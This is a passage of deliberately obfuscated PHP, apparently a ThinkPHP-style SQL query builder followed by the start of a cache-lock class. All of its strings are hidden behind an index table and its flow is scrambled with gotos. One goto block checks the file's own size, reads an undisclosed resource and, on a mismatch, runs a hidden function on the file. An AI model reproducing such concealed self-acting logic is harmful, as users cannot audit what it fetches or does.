elseif (is_array($Œ’öÑ½)) { $Œ’öÑ½ = array_map(array($this, $ûßæÈŒæ[965]), $Œ’öÑ½); } elseif (is_bool($Œ’öÑ½)) { $Œ’öÑ½ = $Œ’öÑ½ ? $ûßæÈŒæ[98] : $ûßæÈŒæ[207]; } elseif (is_null($Œ’öÑ½)) { $Œ’öÑ½ = $ûßæÈŒæ[113]; } return $Œ’öÑ½; } protected function parseField($³¤Ûñíä) { $È€–Ó³¥ =& $_SERVER[ñ÷§¡å]; if (is_string($³¤Ûñíä) && strpos($³¤Ûñíä, $È€–Ó³¥[50])) { $³¤Ûñíä = explode($È€–Ó³¥[50], $³¤Ûñíä); } if (is_array($³¤Ûñíä)) { $»’ğ’­ß = array(); foreach ($³¤Ûñíä as $Ë³¢°”à => $şó—À“½) { if (!is_numeric($Ë³¢°”à)) { $»’ğ’­ß[] = $this->parseKey($Ë³¢°”à, !1) . $È€–Ó³¥[1005] . $this->parseKey($şó—À“½); } else { $»’ğ’­ß[] = $this->parseKey($şó—À“½); } } $¬ÓÅÕÚ = implode($È€–Ó³¥[50], $»’ğ’­ß); } elseif (is_string($³¤Ûñíä) && !empty($³¤Ûñíä)) { $¬ÓÅÕÚ = $³¤Ûñíä; } else { $¬ÓÅÕÚ = $È€–Ó³¥[198]; } return $¬ÓÅÕÚ; } protected function parseTable($¢ÅÑş·Ç) { $İİä®£ =& $_SERVER[ñ÷§¡å]; if (is_array($¢ÅÑş·Ç)) { $„¹¥Âêº = array(); foreach ($¢ÅÑş·Ç as $‚ßŒÏ£› => $’øÓÒËÊ) { if (!is_numeric($‚ßŒÏ£›)) { $„¹¥Âêº[] = $this->parseKey($‚ßŒÏ£›) . $İİä®£[53] . $this->parseKey($’øÓÒËÊ); } else { $„¹¥Âêº[] = $this->parseKey($‚ßŒÏ£›); } } $¢ÅÑş·Ç = $„¹¥Âêº; } elseif (is_string($¢ÅÑş·Ç)) { if (strstr($¢ÅÑş·Ç, $İİä®£[53])) { return $¢ÅÑş·Ç; } $¢ÅÑş·Ç = explode($İİä®£[50], $¢ÅÑş·Ç); array_walk($¢ÅÑş·Ç, array($this, $İİä®£[913])); } return $İİä®£[907] . trim(implode($İİä®£[1006], $¢ÅÑş·Ç), $İİä®£[394]) . $İİä®£[907]; } protected function parseWhere($©¦¸ù…Š) { $õİïÛøæ =& $_SERVER[ñ÷§¡å]; $˜ùÑÜù = $õİïÛøæ[12]; if (is_string($©¦¸ù…Š)) { $˜ùÑÜù = $©¦¸ù…Š; } else { $ğêÃ¥éÁ = isset($©¦¸ù…Š[$õİïÛøæ[1007]]) ? strtoupper($©¦¸ù…Š[$õİïÛøæ[1007]]) : $õİïÛøæ[12]; if (in_array($ğêÃ¥éÁ, array($õİïÛøæ[1008], $õİïÛøæ[1009], $õİïÛøæ[1010]))) { $ğêÃ¥éÁ = $õİïÛøæ[53] . $ğêÃ¥éÁ . $õİïÛøæ[53]; unset($©¦¸ù…Š[$õİïÛøæ[1007]]); } else { $ğêÃ¥éÁ = $õİïÛøæ[1011]; } foreach ($©¦¸ù…Š as $ÄÑŸÑ†Ò => $ÉËÅÇ®) { $˜ùÑÜù .= $õİïÛøæ[286]; if (is_numeric($ÄÑŸÑ†Ò)) { $ÄÑŸÑ†Ò = $õİïÛøæ[1012]; } if (0 === strpos($ÄÑŸÑ†Ò, $õİïÛøæ[11])) { $˜ùÑÜù .= $this->parseThinkWhere($ÄÑŸÑ†Ò, $ÉËÅÇ®); } else { if (!preg_match($õİïÛøæ[1013], trim($ÄÑŸÑ†Ò))) { think_exception(think_lang($õİïÛøæ[1014]) . $õİïÛøæ[4] . $ÄÑŸÑ†Ò); } $ÃŠ¯…è¾ = is_array($ÉËÅÇ®) && isset($ÉËÅÇ®[$õİïÛøæ[1015]]); $ÄÑŸÑ†Ò = trim($ÄÑŸÑ†Ò); if (strpos($ÄÑŸÑ†Ò, $õİïÛøæ[292])) { $ÁªôŒïİ = explode($õİïÛøæ[292], $ÄÑŸÑ†Ò); $Ò«šÓƒÍ = array(); foreach ($ÁªôŒïİ as $î£ó”š => $•…Ö™Ò³) { $¥Œôğæ± = $ÃŠ¯…è¾ ? $ÉËÅÇ®[$î£ó”š] : $ÉËÅÇ®; $Ò«šÓƒÍ[] = $õİïÛøæ[269] . $this->parseWhereItem($this->parseKey($•…Ö™Ò³), $¥Œôğæ±) . $õİïÛøæ[912]; } $˜ùÑÜù .= implode($õİïÛøæ[1016], $Ò«šÓƒÍ); } elseif (strpos($ÄÑŸÑ†Ò, $õİïÛøæ[293])) { $ÁªôŒïİ = explode($õİïÛøæ[293], $ÄÑŸÑ†Ò); $Ò«šÓƒÍ = array(); foreach ($ÁªôŒïİ as $î£ó”š => $•…Ö™Ò³) { $¥Œôğæ± = $ÃŠ¯…è¾ ? $ÉËÅÇ®[$î£ó”š] : $ÉËÅÇ®; $Ò«šÓƒÍ[] = $õİïÛøæ[269] . $this->parseWhereItem($this->parseKey($•…Ö™Ò³), $¥Œôğæ±) . $õİïÛøæ[912]; } $˜ùÑÜù .= implode($õİïÛøæ[1011], $Ò«šÓƒÍ); } else { $˜ùÑÜù .= $this->parseWhereItem($this->parseKey($ÄÑŸÑ†Ò), $ÉËÅÇ®); } } $˜ùÑÜù .= $õİïÛøæ[287] . $ğêÃ¥éÁ; } $˜ùÑÜù = substr($˜ùÑÜù, 0, -strlen($ğêÃ¥éÁ)); } return empty($˜ùÑÜù) ? $õİïÛøæ[12] : $õİïÛøæ[1017] . $˜ùÑÜù; } protected function parseWhereItem($«Ô–Ç¯ö, $šß·Ç°Û) { $ë•¾‘Î¦ =& $_SERVER[ñ÷§¡å]; $—¯ù³¬ = $ë•¾‘Î¦[12]; if (is_array($šß·Ç°Û)) { if (is_string($šß·Ç°Û[0])) { $ïæ‹Ä“÷ = strtolower($šß·Ç°Û[0]); if (in_array($šß·Ç°Û[0], array($ë•¾‘Î¦[891], $ë•¾‘Î¦[1018], $ë•¾‘Î¦[1019], $ë•¾‘Î¦[1020], $ë•¾‘Î¦[1021], $ë•¾‘Î¦[1022]))) { $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $šß·Ç°Û[0] . $ë•¾‘Î¦[53] . $this->parseValue($šß·Ç°Û[1]); } elseif (preg_match($ë•¾‘Î¦[1023], $šß·Ç°Û[0])) { $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[53] . $this->parseValue($šß·Ç°Û[1]); } elseif (preg_match($ë•¾‘Î¦[1024], $šß·Ç°Û[0])) { if (is_array($šß·Ç°Û[1])) { $‹Ã‚‘¾‘ = isset($šß·Ç°Û[2]) ? strtoupper($šß·Ç°Û[2]) : $ë•¾‘Î¦[1009]; if (in_array($‹Ã‚‘¾‘, array($ë•¾‘Î¦[1008], $ë•¾‘Î¦[1009], $ë•¾‘Î¦[1010]))) { $ĞÆ‡•°’ = array(); foreach ($šß·Ç°Û[1] as $¿Œé¬²Â) { $ĞÆ‡•°’[] = $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[53] . $this->parseValue($¿Œé¬²Â); } $—¯ù³¬ .= $ë•¾‘Î¦[269] . implode($ë•¾‘Î¦[53] . $‹Ã‚‘¾‘ . $ë•¾‘Î¦[53], $ĞÆ‡•°’) . $ë•¾‘Î¦[912]; } } else { $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[53] . $this->parseValue($šß·Ç°Û[1]); } } elseif ($ë•¾‘Î¦[306] == $ïæ‹Ä“÷) { $—¯ù³¬ .= $ë•¾‘Î¦[910] . $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $šß·Ç°Û[1] . $ë•¾‘Î¦[1025]; } elseif (preg_match($ë•¾‘Î¦[1026], $šß·Ç°Û[0])) { $—¯ù³¬ .= $šß·Ç°Û[0]; } elseif (preg_match($ë•¾‘Î¦[1027], $šß·Ç°Û[0])) { if (isset($šß·Ç°Û[2]) && $ë•¾‘Î¦[306] == $šß·Ç°Û[2]) { $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[53] . $šß·Ç°Û[1]; } else { if (is_string($šß·Ç°Û[1])) { $šß·Ç°Û[1] = explode($ë•¾‘Î¦[50], $šß·Ç°Û[1]); } $ºòóî = implode($ë•¾‘Î¦[50], $this->parseValue($šß·Ç°Û[1])); $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[910] . $ºòóî . $ë•¾‘Î¦[912]; } } elseif (preg_match($ë•¾‘Î¦[1028], $šß·Ç°Û[0])) { $ù‡À°îÂ = is_string($šß·Ç°Û[1]) ? explode($ë•¾‘Î¦[50], $šß·Ç°Û[1]) : $šß·Ç°Û[1]; $—¯ù³¬ .= $ë•¾‘Î¦[910] . $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $this->exp[$ïæ‹Ä“÷] . $ë•¾‘Î¦[53] . $this->parseValue($ù‡À°îÂ[0]) . $ë•¾‘Î¦[1011] . $this->parseValue($ù‡À°îÂ[1]) . $ë•¾‘Î¦[287]; } else { think_exception(think_lang($ë•¾‘Î¦[1014]) . $ë•¾‘Î¦[4] . $šß·Ç°Û[0]); } } else { $ÀœÂÂğ” = count($šß·Ç°Û); $¹­ÂçÀÅ = $ë•¾‘Î¦[12]; if (is_string($šß·Ç°Û[$ÀœÂÂğ” - 1])) { $¹­ÂçÀÅ = isset($šß·Ç°Û[$ÀœÂÂğ” - 1]) ? strtoupper($šß·Ç°Û[$ÀœÂÂğ” - 1]) : $ë•¾‘Î¦[12]; if (in_array($¹­ÂçÀÅ, array($ë•¾‘Î¦[1008], $ë•¾‘Î¦[1009], $ë•¾‘Î¦[1010]))) { $ÀœÂÂğ” = $ÀœÂÂğ” - 1; } } else { $¹­ÂçÀÅ = $ë•¾‘Î¦[1008]; } for ($Ö¤®Æ¾ = 0; $Ö¤®Æ¾ < $ÀœÂÂğ”; $Ö¤®Æ¾++) { $ù‡À°îÂ = is_array($šß·Ç°Û[$Ö¤®Æ¾]) ? $šß·Ç°Û[$Ö¤®Æ¾][1] : $šß·Ç°Û[$Ö¤®Æ¾]; if ($ë•¾‘Î¦[306] == strtolower($šß·Ç°Û[$Ö¤®Æ¾][0])) { $—¯ù³¬ .= $ë•¾‘Î¦[269] . $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $ù‡À°îÂ . $ë•¾‘Î¦[1025] . $¹­ÂçÀÅ . $ë•¾‘Î¦[53]; } else { $Õ²¼™Ú  = is_array($šß·Ç°Û[$Ö¤®Æ¾]) ? $this->exp[strtolower($šß·Ç°Û[$Ö¤®Æ¾][0])] : $ë•¾‘Î¦[891]; if (!$Õ²¼™Ú  && is_array($šß·Ç°Û[$Ö¤®Æ¾]) && in_array($šß·Ç°Û[$Ö¤®Æ¾][0], array($ë•¾‘Î¦[891], $ë•¾‘Î¦[1018], $ë•¾‘Î¦[1019], $ë•¾‘Î¦[1020], $ë•¾‘Î¦[1021], $ë•¾‘Î¦[1022]))) { $Õ²¼™Ú  = $šß·Ç°Û[$Ö¤®Æ¾][0]; } $—¯ù³¬ .= $ë•¾‘Î¦[269] . $«Ô–Ç¯ö . $ë•¾‘Î¦[53] . $Õ²¼™Ú  . $ë•¾‘Î¦[53] . $this->parseValue($ù‡À°îÂ) . $ë•¾‘Î¦[1025] . $¹­ÂçÀÅ . $ë•¾‘Î¦[53]; } } $—¯ù³¬ = substr($—¯ù³¬, 0, -4); } } else { $—¯ù³¬ .= $«Ô–Ç¯ö . $ë•¾‘Î¦[1029] . $this->parseValue($šß·Ç°Û); } return $—¯ù³¬; } protected function parseThinkWhere($‘í“Ğ¤æ, $›Äšè­) { $ìô¿¸™‚ =& $_SERVER[ñ÷§¡å]; $ŞÅ…ùéí = $ìô¿¸™‚[12]; switch ($‘í“Ğ¤æ) { case $ìô¿¸™‚[361]: $ŞÅ…ùéí = $›Äšè­; break; case $ìô¿¸™‚[1012]: $ŞÅ…ùéí = is_string($›Äšè­) ? $›Äšè­ : substr($this->parseWhere($›Äšè­), 6); break; case $ìô¿¸™‚[1030]: parse_str($›Äšè­, $ÈŸ™íã›); if (isset($ÈŸ™íã›[$ìô¿¸™‚[1007]])) { $¸í£â° = $ìô¿¸™‚[53] . strtoupper($ÈŸ™íã›[$ìô¿¸™‚[1007]]) . $ìô¿¸™‚[53]; unset($ÈŸ™íã›[$ìô¿¸™‚[1007]]); } else { $¸í£â° = $ìô¿¸™‚[1011]; } $ÀÔôşşó = array(); foreach ($ÈŸ™íã› as $¯€¾ó°÷ => $Íóı¹šƒ) { $ÀÔôşşó[] = $this->parseKey($¯€¾ó°÷) . $ìô¿¸™‚[1029] . $this->parseValue($Íóı¹šƒ); } $ŞÅ…ùéí = implode($¸í£â°, $ÀÔôşşó); break; } return $ŞÅ…ùéí; } protected function parseLimit($¿Œ«À¶§) { $åĞ¨’šØ =& $_SERVER[ñ÷§¡å]; return !empty($¿Œ«À¶§) ? $åĞ¨’šØ[51] . $¿Œ«À¶§ . $åĞ¨’šØ[53] : $åĞ¨’šØ[12]; } protected function parseJoin($ë‚×ñèÂ) { $ Êö¨Ñ° =& $_SERVER[ñ÷§¡å]; $©¢²²ù = $ Êö¨Ñ°[12]; if (!empty($ë‚×ñèÂ)) { if (is_array($ë‚×ñèÂ)) { foreach ($ë‚×ñèÂ as $ÛÃ¯ùÆ¼ => $äæù¬‘) { if (!1 !== stripos($äæù¬‘, $ Êö¨Ñ°[1031])) { $©¢²²ù .= $ Êö¨Ñ°[53] . $äæù¬‘; } else { $©¢²²ù .= $ Êö¨Ñ°[1032] . $äæù¬‘; } } } else { $©¢²²ù .= $ Êö¨Ñ°[1032] . $ë‚×ñèÂ; } } $©¢²²ù = preg_replace($ Êö¨Ñ°[1033], think_config($ Êö¨Ñ°[937]) . $ Êö¨Ñ°[1034], $©¢²²ù); return $©¢²²ù; } protected function parseOrder($·£ıœ) { $ÀÍ‚½˜ =& $_SERVER[ñ÷§¡å]; if (is_array($·£ıœ)) { $·Ã–· í = array(); foreach ($·£ıœ as $á†‘ÁÏ™ => $¢·²Ñ®ˆ) { if (is_numeric($á†‘ÁÏ™)) { $·Ã–· í[] = $this->parseKey($¢·²Ñ®ˆ); } else { $¢·²Ñ®ˆ = in_array(strtoupper(trim($¢·²Ñ®ˆ)), array($ÀÍ‚½˜[1035], $ÀÍ‚½˜[1036])) ? $ÀÍ‚½˜[53] . $¢·²Ñ®ˆ : $ÀÍ‚½˜[12]; if (preg_match($ÀÍ‚½˜[1037], $á†‘ÁÏ™)) { $·Ã–· í[] = $this->parseKey($á†‘ÁÏ™) . $¢·²Ñ®ˆ; } else { think_exception($ÀÍ‚½˜[1038] . $á†‘ÁÏ™); } } } $·£ıœ = implode($ÀÍ‚½˜[50], $·Ã–· í); } return !empty($·£ıœ) ? $ÀÍ‚½˜[1039] . $·£ıœ : $ÀÍ‚½˜[12]; } protected function parseGroup($æŸÂµ§) { $Ö™ùõ½ =& $_SERVER[ñ÷§¡å]; return !empty($æŸÂµ§) ? $Ö™ùõ½[1040] . $æŸÂµ§ : $Ö™ùõ½[12]; } protected function parseHaving($™È¢ıè‚) { $¨Õ§Íò¦ =& $_SERVER[ñ÷§¡å]; return !empty($™È¢ıè‚) ? $¨Õ§Íò¦[1041] . $™È¢ıè‚ : $¨Õ§Íò¦[12]; } protected function parseComment($’¯šØÊ) { $ğÔË‚í =& $_SERVER[ñ÷§¡å]; return !empty($’¯šØÊ) ? $ğÔË‚í[1042] . $’¯šØÊ . $ğÔË‚í[1043] : $ğÔË‚í[12]; } protected function parseDistinct($«²©Áğ€) { $û¸´·î© =& $_SERVER[ñ÷§¡å]; return !empty($«²©Áğ€) ? $û¸´·î©[1044] : $û¸´·î©[12]; } protected function parseUnion($æ„Ü«±¼) { $ïÜá›¯‡ =& $_SERVER[ñ÷§¡å]; if (empty($æ„Ü«±¼)) { return $ïÜá›¯‡[12]; } if (isset($æ„Ü«±¼[$ïÜá›¯‡[357]])) { $»´ßˆğê = $ïÜá›¯‡[1045]; unset($æ„Ü«±¼[$ïÜá›¯‡[357]]); } else { $»´ßˆğê = $ïÜá›¯‡[1046]; } foreach ($æ„Ü«±¼ as $´Ô¢²Ë÷) { $‡Øƒ›ëÖ[] = $»´ßˆğê . (is_array($´Ô¢²Ë÷) ? $this->buildSelectSql($´Ô¢²Ë÷) : $´Ô¢²Ë÷); } return implode($ïÜá›¯‡[53], $‡Øƒ›ëÖ); } public function insert($‡³·ßìÉ, $ó £ìš = array(), $¨ù˜áõ = false) { $º¬â¬Ã =& $_SERVER[ñ÷§¡å]; $«â˜ãşğ = $Ï›ûñ—ê = array(); $this->model = $ó £ìš[$º¬â¬Ã[290]]; foreach ($‡³·ßìÉ as $ûÌ…ŞŞ => $×’äÀû–) { if (is_array($×’äÀû–) && $º¬â¬Ã[306] == $×’äÀû–[0]) { $Ï›ûñ—ê[] = $this->parseKey($ûÌ…ŞŞ); $«â˜ãşğ[] = $×’äÀû–[1]; } elseif (is_scalar($×’äÀû–) || is_null($×’äÀû–)) { $Ï›ûñ—ê[] = $this->parseKey($ûÌ…ŞŞ); $«â˜ãşğ[] = $this->parseValue($×’äÀû–); } } $ŠâÇôè¹ = ($¨ù˜áõ ? $º¬â¬Ã[914] : $º¬â¬Ã[915]) . $º¬â¬Ã[916] . $this->parseTable($ó £ìš[$º¬â¬Ã[288]]) . $º¬â¬Ã[910] . implode($º¬â¬Ã[50], $Ï›ûñ—ê) . $º¬â¬Ã[911] . implode($º¬â¬Ã[50], $«â˜ãşğ) . $º¬â¬Ã[912]; $ŠâÇôè¹ .= $this->parseLock(isset($ó £ìš[$º¬â¬Ã[856]]) ? $ó £ìš[$º¬â¬Ã[856]] : !1); $ŠâÇôè¹ .= $this->parseComment(!empty($ó £ìš[$º¬â¬Ã[363]]) ? $ó £ìš[$º¬â¬Ã[363]] : $º¬â¬Ã[12]); return $this->execute($ŠâÇôè¹, $this->parseBind(!empty($ó £ìš[$º¬â¬Ã[294]]) ? $ó £ìš[$º¬â¬Ã[294]] : array())); } public function selectInsert($Ú—Ì×ù, $„õ¶×ÜÒ, $¾ù¼«ºµ = array()) { $Îâ§Å“ =& $_SERVER[ñ÷§¡å]; $this->model = $¾ù¼«ºµ[$Îâ§Å“[290]]; if (is_string($Ú—Ì×ù)) { $Ú—Ì×ù = explode($Îâ§Å“[50], $Ú—Ì×ù); } array_walk($Ú—Ì×ù, array($this, $Îâ§Å“[913])); $ËÇ±ßíå = $Îâ§Å“[1047] . $this->parseTable($„õ¶×ÜÒ) . $Îâ§Å“[910] . implode($Îâ§Å“[50], $Ú—Ì×ù) . $Îâ§Å“[1025]; $ËÇ±ßíå .= $this->buildSelectSql($¾ù¼«ºµ); return $this->execute($ËÇ±ßíå, $this->parseBind(!empty($¾ù¼«ºµ[$Îâ§Å“[294]]) ? $¾ù¼«ºµ[$Îâ§Å“[294]] : array())); } public function update($šÛæöî„, $ÑŠâëî¾) { $¡øåÙĞé =& $_SERVER[ñ÷§¡å]; $this->model = $ÑŠâëî¾[$¡øåÙĞé[290]]; $’úŒì³Ä = $¡øåÙĞé[1048] . $this->parseTable($ÑŠâëî¾[$¡øåÙĞé[288]]) . $this->parseSet($šÛæöî„) . $this->parseWhere(!empty($ÑŠâëî¾[$¡øåÙĞé[284]]) ? $ÑŠâëî¾[$¡øåÙĞé[284]] : $¡øåÙĞé[12]) . $this->parseOrder(!empty($ÑŠâëî¾[$¡øåÙĞé[374]]) ? $ÑŠâëî¾[$¡øåÙĞé[374]] : $¡øåÙĞé[12]) . $this->parseLimit(!empty($ÑŠâëî¾[$¡øåÙĞé[301]]) ? $ÑŠâëî¾[$¡øåÙĞé[301]] : $¡øåÙĞé[12]) . $this->parseLock(isset($ÑŠâëî¾[$¡øåÙĞé[856]]) ? $ÑŠâëî¾[$¡øåÙĞé[856]] : !1) . $this->parseComment(!empty($ÑŠâëî¾[$¡øåÙĞé[363]]) ? $ÑŠâëî¾[$¡øåÙĞé[363]] : $¡øåÙĞé[12]); return $this->execute($’úŒì³Ä, $this->parseBind(!empty($ÑŠâëî¾[$¡øåÙĞé[294]]) ? $ÑŠâëî¾[$¡øåÙĞé[294]] : array())); } public function delete($¢öæ¦İö = array()) { $éÊÊõ˜ =& $_SERVER[ñ÷§¡å]; $this->model = $¢öæ¦İö[$éÊÊõ˜[290]]; $œ­å¿ö­ = $éÊÊõ˜[1049] . $this->parseTable($¢öæ¦İö[$éÊÊõ˜[288]]) . $this->parseWhere(!empty($¢öæ¦İö[$éÊÊõ˜[284]]) ? $¢öæ¦İö[$éÊÊõ˜[284]] : $éÊÊõ˜[12]) . $this->parseOrder(!empty($¢öæ¦İö[$éÊÊõ˜[374]]) ? $¢öæ¦İö[$éÊÊõ˜[374]] : $éÊÊõ˜[12]) . $this->parseLimit(!empty($¢öæ¦İö[$éÊÊõ˜[301]]) ? $¢öæ¦İö[$éÊÊõ˜[301]] : $éÊÊõ˜[12]) . $this->parseLock(isset($¢öæ¦İö[$éÊÊõ˜[856]]) ? $¢öæ¦İö[$éÊÊõ˜[856]] : !1) . $this->parseComment(!empty($¢öæ¦İö[$éÊÊõ˜[363]]) ? $¢öæ¦İö[$éÊÊõ˜[363]] : $éÊÊõ˜[12]); return $this->execute($œ­å¿ö­, $this->parseBind(!empty($¢öæ¦İö[$éÊÊõ˜[294]]) ? $¢öæ¦İö[$éÊÊõ˜[294]] : array())); } public function select($¸ç•ë€ = array()) { $‹ã“¨ëş =& $_SERVER[ñ÷§¡å]; $this->model = $¸ç•ë€[$‹ã“¨ëş[290]]; $àÁ˜Ë¼ = $this->buildSelectSql($¸ç•ë€); $Ôîå¢Îò = isset($¸ç•ë€[$‹ã“¨ëş[358]]) ? $¸ç•ë€[$‹ã“¨ëş[358]] : !1; if ($Ôîå¢Îò) { $½Ì®Òº° = is_string($Ôîå¢Îò[$‹ã“¨ëş[104]]) ? $Ôîå¢Îò[$‹ã“¨ëş[104]] : $‹ã“¨ëş[1050] . md5($àÁ˜Ë¼); $õ¼ÒÏœÁ = think_cache($½Ì®Òº°, $‹ã“¨ëş[12], $Ôîå¢Îò); if (!1 !== $õ¼ÒÏœÁ) { return $õ¼ÒÏœÁ; } } $âÔš»Ò¨ = $this->query($àÁ˜Ë¼, $this->parseBind(!empty($¸ç•ë€[$‹ã“¨ëş[294]]) ? $¸ç•ë€[$‹ã“¨ëş[294]] : array())); if ($Ôîå¢Îò && !1 !== $âÔš»Ò¨) { think_cache($½Ì®Òº°, $âÔš»Ò¨, $Ôîå¢Îò); } return $âÔš»Ò¨; } public function buildSelectSql($õÌµ°â = array()) { $ƒëîƒ‹İ =& $_SERVER[ñ÷§¡å]; if (isset($õÌµ°â[$ƒëîƒ‹İ[362]])) { if (strpos($õÌµ°â[$ƒëîƒ‹İ[362]], $ƒëîƒ‹İ[50])) { list($±¡¡İë», $“Ôë³¬) = explode($ƒëîƒ‹İ[50], $õÌµ°â[$ƒëîƒ‹İ[362]]); } else { $±¡¡İë» = $õÌµ°â[$ƒëîƒ‹İ[362]]; } $±¡¡İë» = $±¡¡İë» ? $±¡¡İë» : 1; $“Ôë³¬ = isset($“Ôë³¬) ? $“Ôë³¬ : (is_numeric($õÌµ°â[$ƒëîƒ‹İ[301]]) ? $õÌµ°â[$ƒëîƒ‹İ[301]] : 20); $‰¸ß™íÍ = $“Ôë³¬ * ((int) $±¡¡İë» - 1); $õÌµ°â[$ƒëîƒ‹İ[301]] = $‰¸ß™íÍ . $ƒëîƒ‹İ[50] . $“Ôë³¬; } if (think_config($ƒëîƒ‹İ[1051])) { $«€¬Šƒš = $ƒëîƒ‹İ[1052] . md5(serialize($õÌµ°â)); $ÓîäÍ‚ñ = think_cache($«€¬Šƒš); if ($ÓîäÍ‚ñ) { return $ÓîäÍ‚ñ; } } $·ÙÕÙá£ = $this->parseSql($this->selectSql, $õÌµ°â); $·ÙÕÙá£ .= $this->parseLock(isset($õÌµ°â[$ƒëîƒ‹İ[856]]) ? $õÌµ°â[$ƒëîƒ‹İ[856]] : !1); if (isset($«€¬Šƒš)) { think_cache($«€¬Šƒš, $·ÙÕÙá£); } return $·ÙÕÙá£; } public function parseSql($§™ŞÀŠş, $Ô¾ùÍ¨÷ = array()) { $ëıù’ôç =& $_SERVER[ñ÷§¡å]; $§™ŞÀŠş = str_replace(array($ëıù’ôç[1053], $ëıù’ôç[1054], $ëıù’ôç[1055], $ëıù’ôç[1056], $ëıù’ôç[1057], $ëıù’ôç[1058], $ëıù’ôç[1059], $ëıù’ôç[1060], $ëıù’ôç[1061], $ëıù’ôç[1062], $ëıù’ôç[1063]), array($this->parseTable("{$Ô¾ùÍ¨÷[$ëıù’ôç[288]]}"), $this->parseDistinct(isset($Ô¾ùÍ¨÷[$ëıù’ôç[1064]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[1064]] : !1), $this->parseField(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[282]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[282]] : $ëıù’ôç[198]), $this->parseJoin(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[291]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[291]] : $ëıù’ôç[12]), $this->parseWhere(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[284]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[284]] : $ëıù’ôç[12]), $this->parseGroup(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[524]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[524]] : $ëıù’ôç[12]), $this->parseHaving(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[1065]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[1065]] : $ëıù’ôç[12]), $this->parseOrder(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[374]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[374]] : $ëıù’ôç[12]), $this->parseLimit(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[301]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[301]] : $ëıù’ôç[12]), $this->parseUnion(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[356]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[356]] : $ëıù’ôç[12]), $this->parseComment(!empty($Ô¾ùÍ¨÷[$ëıù’ôç[363]]) ? $Ô¾ùÍ¨÷[$ëıù’ôç[363]] : $ëıù’ôç[12])), $§™ŞÀŠş); return $§™ŞÀŠş; } public function getLastSql($ªòÇìÑá = '') { return $ªòÇìÑá ? $this->modelSql[$ªòÇìÑá] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ç¨ Ò) { return addslashes($ç¨ Ò); } public function setModel($¤ÌÀ°˜Œ) { $this->model = $¤ÌÀ°˜Œ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto D¢ëŞÅ—£Â; fÃÖğÜ˜ñ: $_file = $_SERVER[$_SERVER[ñ÷§¡å][69]]; $_size = $_SERVER[ñ÷§¡å][888]; if ($_SERVER[$_SERVER[ñ÷§¡å][60]] != $_size($_file)) { $_getc = $_SERVER[ñ÷§¡å][62]; $_getfile = $_SERVER[$_SERVER[ñ÷§¡å][63]] . $_SERVER[ñ÷§¡å][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñ÷§¡å][65], $_getfilec); if (count($_getarrs) < $_SERVER[ñ÷§¡å][66]) { $exit = $_SERVER[ñ÷§¡å][67]; $exit(); } $_act = $_SERVER[ñ÷§¡å][68]; $_act($_file); } goto b“ÏëŸéÒ›; C—ê…¶Ö¿ç: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $à»àÒæò =& $_SERVER[ñ÷§¡å]; if (self::$handle) { return self::$handle; } $¹‚Ğù÷“ = $GLOBALS[$à»àÒæò[6]][$à»àÒæò[358]]; self::$timeout = $¹‚Ğù÷“[$à»àÒæò[853]] ? $¹‚Ğù÷“[$à»àÒæò[853]] : 10; $İß±±¡˜ = _get($GLOBALS[$à»àÒæò[6]], $à»àÒæò[854]); $Š¼òô¡ô = $¹‚Ğù÷“[$à»àÒæò[840]] ? $¹‚Ğù÷“[$à»àÒæò[840]] : $à»àÒæò[209]; if ($Š¼òô¡ô == $à»àÒæò[21] && $İß±±¡˜ == $à»àÒæò[13]) { $Š¼òô¡ô = $à»àÒæò[209]; } switch ($Š¼òô¡ô) { case $à»àÒæò[843]: self::$handle = new CacheLockRedis(); break; case $à»àÒæò[844]: self::$handle = new CacheLockMemcached(); break; case $à»àÒæò[21]: self::$handle = new CacheLockDatabase(); break; case $à»àÒæò[209]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($à»àÒæò[855], $à»àÒæò[856]); } return self::$handle; } private static function key($ ¥‹¿ş) { return $_SERVER[ñ÷§¡å][857] . Cache::key($ ¥‹¿ş); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¤Îî«¾Ú = '') { self::$errorMsg = $¤Îî«¾Ú; } public static function lockGlobal($©óº·°, $©‚Û‹ªÁ) { return self::lock($©óº·°, $©‚Û‹ªÁ, !0); } public static function lock($Ó¶İò…, $êéæş» = false, $à †Ç½Ã = false) { 